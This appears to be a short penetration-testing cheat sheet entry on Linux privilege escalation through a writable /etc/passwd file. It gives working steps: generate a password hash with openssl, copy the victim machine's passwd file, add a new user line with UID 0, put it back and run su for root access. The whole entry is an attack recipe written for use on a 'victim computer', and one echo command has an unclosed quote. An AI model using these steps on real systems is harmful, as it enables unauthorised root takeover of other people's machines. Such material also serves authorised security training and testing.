Files for PE
***************

/etc/passwd
##############

Make sure to check the permissions of `/etc/passwd` to see if you can manually create a user. To do this, run the following commands.

.. code-block:: console

        openssl passwd –1 –salt <username> <password>

You then copy the `/etc/passwd` output in the victim computer into a new passwd file on the attack computer. You then echo the following in the new `passwd` file

.. code-block:: console

   echo "<username>:<previous_openssl_cmd_output>:0:0:root:<home_folder_of_user>:/bin/sh

You then download it, copy it, and then run `su - <username>` to get elevated privileges
